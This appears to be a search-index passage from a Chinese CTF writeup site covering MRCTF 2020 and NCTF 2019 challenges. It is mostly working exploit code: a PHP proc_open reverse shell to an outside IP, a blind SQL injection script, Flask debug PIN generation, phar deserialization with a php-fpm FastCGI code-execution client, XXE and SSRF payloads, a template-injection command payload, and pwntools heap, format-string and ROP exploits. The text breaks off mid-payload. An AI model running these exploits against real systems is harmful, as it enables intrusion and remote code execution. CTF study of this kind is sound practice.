\u67e5\u770b\u4e00\u4e0bbss\u6bb5\u53ef\u4ee5\u53d1\u73b0\uff0cflag\u53d8\u91cf\u5728qu\u6570\u7ec4\u4e0b\u65b9\uff0c\u76f8\u5f53\u4e8equ[1000]\uff0c\u5728SPFA\u51fd\u6570\u91cc\u7406\u8bba\u53ef\u4ee5\u8bbf\u95ee\u5e76\u4fee\u6539qu[1000]\uff0c\u4e8e\u662f\u9700\u8981\u6784\u5efa\u7279\u6b8a\u7684\u56fe\u6765\u4f7f\u961f\u5217\uff08qu\u6570\u7ec4\uff09\u8d8a\u754c\u3002 \u4ed4\u7ec6\u5206\u6790\u53ef\u4ee5\u77e5\u9053\uff0cSPFA\u7b97\u6cd5\u5b58\u5728\u4e00\u5904\u5224\u65ad\u9519\u8bef(if(d[y] >= d[x] + len[node]))\uff0c\u8fd9\u4f7f\u5f97\u5982\u679c\u8def\u5f84\u4e2d\u51fa\u73b00\u73af\u4f1a\u53d1\u751f\u6b7b\u5faa\u73af\uff0c\u8282\u70b9\u4e0d\u65ad\u5165\u961f\uff0c\u6700\u540e\u4f7f\u961f\u5217\u6ea2\u51fa\u3002 \u6240\u4ee5\uff0c\u6211\u4eec\u6240\u505a\u7684\uff0c\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a0\u73af\uff0c\u7136\u540e\u6c42\u6700\u77ed\u8def\u3002 exp\uff1a from pwn import * p = process(\"./spfa\") def add(a, b, c): p.sendlineafter(\":\\n\", str(1)) p.sendlineafter(\":\\n\", str(a) + \" \" + str(b) + \" \" + str(c)) def query(a, b): p.sendlineafter(\":\\n\", str(2)) p.sendlineafter(\":\\n\", str(a) + \" \" + str(b)) def get_flag(): p.sendlineafter(\":\\n\", str(3)) add(1, 2, 0) add(2, 1, 0) query(1, 2) get_flag() p.interactive()","title":"spfa"},{"location":"writeup/MRCTF-2020/#shellcode","text":"\u4e3b\u8981\u60f3\u8003\u5bdfGooglehack\u80fd\u529b \u6ca1\u5565\u597d\u8bf4\u7684 \u76f4\u63a5\u53bb http://shell-storm.org/shellcode/ \u6252\u4e2ax64 shellcode\u4e0b\u6765\u5c31\u53ef\u4ee5\u4e86","title":"Shellcode"},{"location":"writeup/MRCTF-2020/#shellcode-revenge","text":"\u4e3b\u8981\u60f3\u8003\u5bdfGooglehack\u80fd\u529b ida\u53ef\u4ee5\u5206\u6790\u51fa\u63d0\u4ea4\u7684Shellcode\u8981\u6ee1\u8db3\u5168\u4e3a\u5927\u5c0f\u5199\u548c\u6570\u5b57\u7684\u9650\u5236 \u53ef\u4ee5\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0 https://hama.hatenadiary.jp/entry/2017/04/04/190129","title":"Shellcode Revenge"},{"location":"writeup/NJUPT-2019/","text":"NJUPT CTF \u5929\u7487Writeup Web hacker_backdoor \u8fd9\u91cc\u662fdisable_function\u5fd8\u8bb0\u6dfb\u52a0proc_open\uff0c\u7528curl\u5e26\u51fa\u6765\u5c31\u597d import requests url = \"http://nctf2019.x1ct34m.com:60004/?useful=/etc/passwd&code=$a=%22create_f%22.%22unction%22;$c=$a(%27%27,$_POST[a]);$c();\" print requests.post(url,data={'a':\"\"\" $descriptorspec=array( 0=>array('pipe','r'), //STDIN 1=>array('pipe','w'),//STDOUT 2=>array('pipe','w') //STDERROR ); $handle=proc_open('bash -c \"bash -i >& /dev/tcp/122.152.230.160/2333 0>&1\"',$descriptorspec,$pipes,NULL); var_dump($handle); \"\"\"}).text simple XSS \u968f\u4fbf\u6ce8\u518c\u540e\u53d1\u73b0\u76f4\u63a5\u53ef\u4ee5XSS\uff0c\u4f46\u662f\u6ca1\u6709\u4efb\u4f55\u65b9\u5411\uff0c\u8fd9\u4e2a\u65f6\u5019admin\u8d26\u6237\u88ab\u6ce8\u518c\u8fc7\u4e86\uff0c\u60f3\u6cd5\u662f\u76f4\u63a5\u7528admin\u7684cookie\u767b\u5165\uff0c\u642d\u5efa\u597d\u5e73\u53f0\u540e\uff0c\u5411admin\u53d1\u9001XSS payload\uff0c\u77ac\u95f4\u770b\u5230\u4e86admin\u7684cookie. burp\u5c06\u5176\u81ea\u5df1\u7528\u6237\u7684COOKIE\u66ff\u6362\u6210\u4e3aadmin\u7684cookie\uff0c\u5f97\u5230flag\uff1aNCTF{Th1s_is_a_Simple_xss} flask_website \u4efb\u610f\u6587\u4ef6\u8bfb+PIN-Debug\uff0cdocker\u6a21\u5f0f\u4e0bmachine\u2014id\u6709\u53d8\u5316\u3002\u66f4\u65b0\u811a\u672c\u5373\u53ef \u53c2\u8003\u6587\u732e\uff1a Flask debug pin\u5b89\u5168\u95ee\u9898 #!/usr/bin/python2.7 #coding:utf-8 from sys import * import requests import re from itertools import chain import hashlib def genpin(mac,mid): probably_public_bits = [ 'ctf',# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.6/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] mac = \"0x\"+mac.replace(\":\",\"\") mac = int(mac,16) private_bits = [ str(mac),# str(uuid.getnode()), /sys/class/net/eth0/address str(mid)# get_machine_id(), /proc/sys/kernel/random/boot_id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num return rv # 02:42:ac:16:00:02 /sys/class/net/eth0/address # 21e83dfd-206c-4e80-86be-e8d0afc467a1 /proc/sys/kernel/random/boot_id def getcode(content): try: return re.findall(r\"<pre>([\\s\\S]*)</pre>\",content)[0].split()[0] except: return '' def getshell(): print genpin(\"02:42:ac:16:00:02\",\"8657e88ac278e9225ba324bb8033ca3398c16c7b517417b55c1f164e90d97a46\") if __name__ == '__main__': print(getshell()) SQLi \u539f\u9898,\u4f7f\u7528REGEXP\u6b63\u5219 import requests url = \"http://nctf2019.x1ct34m.com:40005/index.php\" flag = \"\" k = 0 list = \"qwertyuiopasdfghjklzxcvbnm_0123456789\" while True: k+= 1 print k, for i in list: p = len(requests.post(url,data={ \"passwd\":\"\"\"||passwd/**/REGEXP/**/\"^\\\\{}\";\\x00\"\"\".format(flag+i), \"username\":'\\\\' }).text) if p == 48: # print chr(i) flag += i print flag break easyphp \u5957\u5a03\u9898\uff0c\u6ca1\u5565\u8bf4\u7684 http://nctf2019.x1ct34m.com:60005/?num=23333%0a&str1=2120624&str2=240610708&q%20w%20q=c\\at%20* phar matches everything(\u63a8\u8350\u597d\u597d\u7814\u7a76\u4e00\u4e0b) \u6839\u636evim\u4ea4\u6362\u6587\u4ef6\u5f97\u5230\u6587\u4ef6\u6e90\u7801 \u7b2c\u4e8c\u6b65\u6839\u636e Phar \u6784\u9020\u53cd\u5e8f\u5217\u5316 \u4f7f\u7528curl\u5f97\u5230SSTI \u6700\u540e\u5185\u7f51\u626b\u63cf\u5f97\u5230\u4e00\u4e2ahint => fpm \u7136\u540e\u901a\u8fc7gopher\u534f\u8bae\u5f97\u5230 Phar+SSTI+FPM <?php class Easytest{ protected $test; public function __construct(){ $this->test = '1'; } public function funny_get(){ return $this->test; } } class Main { public $url; public function curl($url){ $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; } public function __destruct(){ $this_is_a_easy_test=unserialize($_GET['careful']); if($this_is_a_easy_test->funny_get() === '1'){ echo $this->curl($this->url); } } } $a = new Easytest(); echo urlencode(serialize($a)); //O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D $m = new Main(); $url = $argv[1]; $m->url = \"\"; #!coding=utf8 import requests import re file = open('phar.phar') url1 = \"http://nctf2019.x1ct34m.com:40004/upload.php\" url2 = \"http://nctf2019.x1ct34m.com:40004/catchmime.php?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D\" def upload(): content = requests.post(url1,files={\"fileToUpload\":('1.gif',file)}).text print content return re.findall(r\"file (.*) has\",content)[0].strip() def req(filename): print requests.post(url2,data={ 'name':'phar:///var/www/html/uploads/{}/test.txt'.format(filename), 'submit':1 }).text name = upload() print name req(name) import socket import random import argparse import sys from io import BytesIO # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client PY2 = True if sys.version_info.major == 2 else False def bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i]) def bord(c): if isinstance(c, int): return c else: return ord(c) def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict') def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return s class FastCGIClient: \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid >> 8) & 0xFF) \\ + bchr(requestid & 0xFF) \\ + bchr((length >> 8) & 0xFF) \\ + bchr(length & 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen < 128: record += bchr(nLen) else: record += bchr((nLen >> 24) | 0x80) \\ + bchr((nLen >> 16) & 0xFF) \\ + bchr((nLen >> 8) & 0xFF) \\ + bchr(nLen & 0xFF) if vLen < 128: record += bchr(vLen) else: record += bchr((vLen >> 24) | 0x80) \\ + bchr((vLen >> 16) & 0xFF) \\ + bchr((vLen >> 8) & 0xFF) \\ + bchr(vLen & 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs={}, post=''): if not self.__connect(): print('connect failure! please check your fasctcgi-server !!') return requestId = random.randint(1, (1 << 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) self.sock.send(request) self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId]['response'] = b'' return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return \"fastcgi connect host:{} port:{}\".format(self.host, self.port) if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = \"/\" uri = args.file content = args.code params = { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': \"%d\" % len(content), 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'safe_mode=Off\\nopen_basedir=Off\\ndisable_functions=Off\\nallow_url_include = On' } response = client.request(params, content) print(force_text(response)) Fake XML cookbook F12\u770b\u4e86\u4e00\u773c\u53d1\u73b0 function doLogin(){ var username = $(\"#username\").val(); var password = $(\"#password\").val(); if(username == \"\" || password == \"\"){ alert(\"Please enter the username and password!\"); return; } var data = \"<user><username>\" + username + \"</username><password>\" + password + \"</password></user>\"; $.ajax({ type: \"POST\", url: \"doLogin.php\", contentType: \"application/xml;charset=utf-8\", data: data, dataType: \"xml\", anysc: false, success: function (result) { var code = result.getElementsByTagName(\"code\")[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(\"msg\")[0].childNodes[0].nodeValue; if(code == \"0\"){ $(\".msg\").text(msg + \" login fail!\"); }else if(code == \"1\"){ $(\".msg\").text(msg + \" login success!\"); }else{ $(\".msg\").text(\"error:\" + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(\".msg\").text(errorThrown + ':' + textStatus); } }); } \u7528XML\u548c\u670d\u52a1\u5668\u901a\u8baf\uff0c\u8054\u60f3\u5230XXE\u653b\u51fb burp\u6293post\u5305\u5f97\u5230 POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40002 Content-Length: 207 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40002 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close <user><username>admin</username><password>123</password></user> \u6839\u636ejs\u811a\u672c\u53ef\u4ee5\u53d1\u73b0username\u662f\u53ef\u4ee5\u56de\u663e\u7684 \u7136\u540e\u6784\u9020\u4e00\u4e0bexp POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40002 Content-Length: 207 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40002 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"> ]> <user><username>&xxe;</username><password>123</password></user> True XML cookbook XML+SSRF\u6253\u5185\u7f51 POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40003 Content-Length: 220 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40003 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=http://192.168.1.8\"> ]> <user><username>&xxe;</username><password>123</password></user> NCTF{XXE-labs_is_g00d} flask \u6a21\u677f\u6ce8\u5165,\u7528\u901a\u914d\u7b26\u8bfbflag http://nctf2019.x1ct34m.com:40007/%7B%7B''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('cat%20/fla?%27).read()%7D%7D Upload your Shell \u4f20\u4e00\u4e2a\u56fe\u7247\u9a6c,\u4f1a\u8fd4\u56de\u4e00\u4e2a\u9898\u76ee\u672c\u8eab\u5c31\u51c6\u5907\u597d\u7684\u56fe\u7247\u9a6c\u7684\u6240\u5728\u76ee\u5f55 \u627e\u4e2a\u5730\u65b9\u5305\u542b\u4e00\u4e0b\u5c31\u597d\u4e86 http://nctf2019.x1ct34m.com:60002/index.php?action=/upload-imgs/9ae46c526dfb6d96e95ad35bfbb2b6c4/Th1s_is_a_fl4g.jpg replace \u586b\u4e09\u4e2a\"#\"\u62a5\u9519 Parse error: syntax error, unexpected end of file in /var/www/html/index.php(70) : regexp code on line 1 Fatal error: preg_replace(): Failed evaluating code: # in /var/www/html/index.php on line 70 \u5b9e\u73b0\u529f\u80fd\u4f7f\u7528\u7684\u662fpreg_replace() \u9898\u76ee\u63d0\u793a\u7528\u4e86php5.6 \u60f3\u5230preg_replace() /e\u53c2\u6570 \u8bd5\u4e00\u4e0b\u53ef\u4ee5\u6267\u884cphpinfo() POST /index.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40006 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 72 Origin: http://nctf2019.x1ct34m.com:40006 Connection: close Referer: http://nctf2019.x1ct34m.com:40006/index.php Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g Upgrade-Insecure-Requests: 1 sub=text&pat=e&rep=phpinfo(); \u4f46\u662f\u76f4\u63a5\u7528readfile('/flag')\u8bfb\u6587\u4ef6\uff0c\u53d1\u73b0\u5355\u5f15\u53f7\u88ab\u62e6\u622a \u4e8e\u662f\u7528chr()\u62fc\u63a5\u8868\u793a\u5b57\u7b26\u4e32\u3002\u3002\u3002\u3002\u3002 POST /index.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40006 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 72 Origin: http://nctf2019.x1ct34m.com:40006 Connection: close Referer: http://nctf2019.x1ct34m.com:40006/index.php Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g Upgrade-Insecure-Requests: 1 sub=text&pat=e&rep=readfile(chr(47).chr(102).chr(108).chr(97).chr(103)); Pwn hello_pwn \u8fde\u63a5nc\u540e\u53d1\u73b0\u8ba9\u6211\u7528pwntools \u6784\u9020exp \u83b7\u5f97flag pwn_me_1 \u57fa\u7840\u6808\u6ea2\u51fa from pwn import * a=remote(\"139.129.76.65\",\"50004\") ad=0x400861 payload='yes\\0'+'a'*12+p64(0x66666666) a.sendline(payload) a.interactive() pwn_me_2 \u57fa\u7840\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 #coding:utf-8 from pwn import * path = './pwn_me_2' local = 0 attach = 0 #P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50005) p.recvuntil('but your name:\\n') p.send('%p'*15) p.recvuntil('preparing......\\n') base = int(p.recv(14),16) - (0x55f5229a5080-0x000055f5227a3000) log.success('base = '+hex(base)) target = base+0x2020e0 p.recvuntil('what do you want?\\n') payload = '%'+str(0x66)+'c%10$hhn'+'%'+str(0x666666-0x66)+'c%11$lln....'+p64(target)+p64(target+1) p.send(payload) #NCTF{rrr_loves_pwn_and_100years} if attach == 1: gdb.attach(p) p.interactive() pwn_me_3 \u57fa\u7840unlink #coding:utf-8 from pwn import * path = './pwn_me_3' local = 1 attach = 0 #P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50006) def add(size,content): p.recvuntil('5,exit\\n') p.sendline('1') p.recvuntil('size:\\n') p.sendline(str(size)) p.recvuntil('content:\\n') p.send(content) def delete(index): p.recvuntil('5,exit\\n') p.sendline('2') p.recvuntil('idx:\\n') p.sendline(str(index)) def show(index): p.recvuntil('5,exit\\n') p.sendline('3') p.recvuntil('idx\\n') p.sendline(str(index)) def edit(index,content): p.recvuntil('5,exit\\n') p.sendline('4') p.recvuntil('idx:\\n') p.sendline(str(index)) p.recvuntil('content:\\n') p.send(content) add(0x10,'\\x00'*0x10) #0 add(0x10,'\\x11'*0x10) #1 delete(0) delete(1) p.recvuntil('5,exit\\n') p.sendline('1') p.recvuntil('size:\\n') p.sendline('0') p.recvuntil('content:\\n') edit(0,'\\x50') show(0) heap_addr = u64(p.recvuntil('\\n',drop=True).ljust(8,'\\x00')) - 0x50 log.success('heap_addr = '+hex(heap_addr)) add(0x38,'\\x11'*0x30) #1 add(0xf0,'\\x22'*0xf0) #2 add(0x20,'\\x33'*0x20) #3 delete(1) payload = p64(0) + p64(0x31) + p64(0x6020e8-0x18) + p64(0x6020e8-0x10) + p64(0)*2 + p64(0x30) add(0x38,payload) delete(2) payload = p64(0)*2 + p64(heap_addr+0x10) edit(1,payload) edit(0,p64(0x66666666)) p.recvuntil('5,exit\\n') p.sendline('5') #NCTF{Ohh!h0pe_y0u_c4n_pwn_100years_too} if attach == 1: gdb.attach(p) p.interactive() warmup \u57fa\u7840rop #coding:utf-8 from pwn import * path = './warm_up' local = 1 attach = 0 P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50007) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p.recvuntil('p!!!\\n') p.send('\\x11'*0x18+'\\x12') p.recvuntil('\\x12') canary = u64(p.recv(7)+'\\x00') log.success('canary = '+hex(canary)) p.recvuntil('?') payload = p64(0)*3 + '\\x00' + p64(canary)[:7] payload+= p64(0) payload+= p64(0x400ab6) p.send(payload) p.recvuntil('warm up!!!') p.send('\\x11'*0x2f+'\\x12') p.recvuntil('\\x12') libcbase = u64(p.recv(6).ljust(8,'\\x00')) - libc.sym['__libc_start_main'] - 240 log.success('libcbase = '+hex(libcbase)) p_rdx_rsi = 0x00000000001150c9 + libcbase p_rdi = 0x400bc3 p_rbp = 0x400970 leave = 0x400a49 flag_addr = 0x601a00 + 0x98 p.recvuntil('?') payload = p64(0)*3 + '\\x00' + p64(canary)[:7] payload+= p64(0) payload+= p64(p_rdi) + p64(0) payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601a00) payload+= p64(libcbase+libc.sym['read']) payload+= p64(p_rbp) + p64(0x601a00) payload+= p64(leave) p.send(payload) raw_input() payload = p64(0x601a00) payload+= p64(p_rdi) + p64(flag_addr) payload+= p64(p_rdx_rsi) + p64(0) + p64(0) payload+= p64(libcbase+libc.sym['open']) payload+= p64(p_rdi) + p64(3) payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601b00) payload+= p64(libcbase+libc.sym['read']) payload+= p64(p_rdi) + p64(1) payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601b00) payload+= p64(libcbase+libc.sym['write']) payload+= './flag' p.send(payload) if attach == 1: gdb.attach(p) p.interactive() easy_rop \u57fa\u7840rop #coding:utf-8 from pwn import * path = './easy_rop' local = 1 attach = 0 P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50002) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') for i in range(26): p.recvuntil(': ') p.sendline(str(0)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') p.recvuntil('28 = ') base1 = int(p.recvuntil('\\n',drop=True),10) log.success('base1 = '+hex(base1)) p.recvuntil(': ') p.sendline('+') p.recvuntil('29 = ') base2 = int(p.recvuntil('\\n',drop=True),10) log.success('base2 = '+hex(base2)) base = str(hex(base2))+str(hex(base1))[2:] base = int(base,16) - (0x55e9d0e36b40-0x000055e9d0e36000) log.success('base = '+hex(base)) start = base + 0x8a0 start1 = str(hex(start))[2:6] start2 = str(hex(start))[6:] start1 = int(start1,16) start2 = int(start2,16) p.recvuntil(': ') p.sendline(str(start2)) p.recvuntil(': ') p.sendline(str(start1)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') p.recvuntil('your name?\\n') p.send('\\x00') #====================================== for i in range(26): p.recvuntil(': ') p.sendline(str(0)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') target = base + 0x201420 target1 = str(hex(target))[2:6] target2 = str(hex(target))[6:] target1 = int(target1,16) target2 = int(target2,16) p.recvuntil(': ') p.sendline(str(target2)) p.recvuntil(': ') p.sendline(str(target1)) leave = base + 0xb31 leave1 = str(hex(leave))[2:6] leave2 = str(hex(leave))[6:] leave1 = int(leave1,16) leave2 = int(leave2,16) p.recvuntil(': ') p.sendline(str(leave2)) p.recvuntil(': ') p.sendline(str(leave1)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') part1 = base + 0xb96 part2 = base + 0xb80 def call_fun(fun_addr,arg1,arg2,arg3): payload = p64(part1) payload+= p64(0) payload+= p64(0) payload+= p64(1) payload+= p64(fun_addr) payload+= p64(arg1) payload+= p64(arg2) payload+= p64(arg3) payload+= p64(part2) payload+= 'a'*0x38 return payload p_rdi = base + 0xba3 p_rbp = base + 0x900 p.recvuntil('your name?\\n') payload = p64(target) payload+= p64(p_rdi) payload+= 